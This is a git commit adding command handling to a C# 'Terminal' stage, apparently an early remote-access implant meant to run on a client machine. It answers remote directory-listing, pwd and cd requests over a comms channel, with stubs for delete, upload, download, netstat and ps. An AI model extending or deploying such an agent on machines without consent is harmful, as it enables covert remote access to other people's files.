159e35ea1be1aeee135f57097bde6bc64cfc03c8
Kyle Erickson <kyle.erickson@gmail.com>
2020-01-09 21:18:49 -0700

    Initial commit of working terminal - need to add command functionality.

--- Terminal/Terminal.cs
+++ Terminal/Terminal.cs
@@ -1,4 +1,6 @@
 ﻿using System;
+using System.IO;
+using System.Text;
 using Reno.Comm;
 
 namespace Reno.Stages
@@ -6,6 +8,7 @@ namespace Reno.Stages
     public class Terminal
     {
         CommChannel channel;
+        string pwd = ".";
 
         /// <summary>
         /// Constructor for the Terminal program to be placed on the client machine
@@ -25,13 +28,95 @@ namespace Reno.Stages
             {
                 // Wait for a header - once its received execute the command
                 CommHeader header = channel.ReceiveHeader();
+                switch (header.Command)
+                {
+                    case CommChannel.EXIT:
+                        run = false;
+                        break;
+                    case CommChannel.LS:
+                        string directory = "";
+
+                        if (header.DataLength == 0)
+                        {
+                            DirectoryInfo dir = new DirectoryInfo(pwd);
+                            Console.WriteLine("Directory {0}", dir.FullName);
+                            directory += dir.FullName + "\n";
+                            foreach (DirectoryInfo i in dir.EnumerateDirectories())
+                            {
+                                directory += i.FullName + "\n";
+                            }
+                            foreach (string file in Directory.EnumerateFiles(pwd))
+                            {
+                                directory += file + "\n";
+                            }
+                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, directory.Length);
+                            Console.WriteLine("[*] Sending {0}", directory);
+                            channel.SendHeader(h);
+                            channel.SendBytes(Encoding.UTF8.GetBytes(directory));
+                        }
+                        else
+                        {
+                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
+                            string sDir = Encoding.UTF8.GetString(dirBytes);
+                            DirectoryInfo dir = new DirectoryInfo(sDir);
+                            Console.WriteLine("Directory {0}", dir.FullName);
+                            directory += dir.FullName + "\n";
+                            foreach (DirectoryInfo i in dir.EnumerateDirectories())
+                            {
+                                directory += i.FullName + "\n";
+                            }
+                            foreach (string file in Directory.EnumerateFiles(sDir))
+                            {
+                                directory += file + "\n";
+                            }
+                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, directory.Length);
+                            Console.WriteLine("[*] Sending {0}", directory);
+                            channel.SendHeader(h);
+                            channel.SendBytes(Encoding.UTF8.GetBytes(directory));
+                        }
+                        break;
+                    case CommChannel.PWD:
+                        DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
+                        CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, pwdInfo.FullName.Length);
+                        Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
+                        channel.SendHeader(pwdHeader);
+                        channel.SendBytes(Encoding.UTF8.GetBytes(pwdInfo.FullName));
+                        break;
+                    case CommChannel.CD:
+                        if(header.DataLength == 0)
+                        {
+                            pwd = "C:\\";
+                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, pwd.Length);
+                            channel.SendHeader(cdHeader);
+                            channel.SendBytes(Encoding.UTF8.GetBytes(pwd));
+                        }
+                        else
+                        {
+                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
+                            string tmpDir = Encoding.UTF8.GetString(dirBytes);
+                            if (Directory.Exists(tmpDir))
+                            {
+                                pwd = tmpDir;
+                            } 
+                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, pwd.Length);
+                            channel.SendHeader(cdHeader);
+                            channel.SendBytes(Encoding.UTF8.GetBytes(pwd));
+                        }
+                        break;
+                    case CommChannel.DELETE:
+                        break;
+                    case CommChannel.UPLOAD:
+                        break;
+                    case CommChannel.DOWNLOAD:
+                        break;
+                    case CommChannel.NETSTAT:
+                        break;
+                    case CommChannel.PS:
+                        break;
+                }
             }
         }
 
-        private void ParseCommand()
-        {
-            throw new NotImplementedException();
-        }
         /// <summary>
         /// Creates a new CommHeader for transmission
         /// </summary>
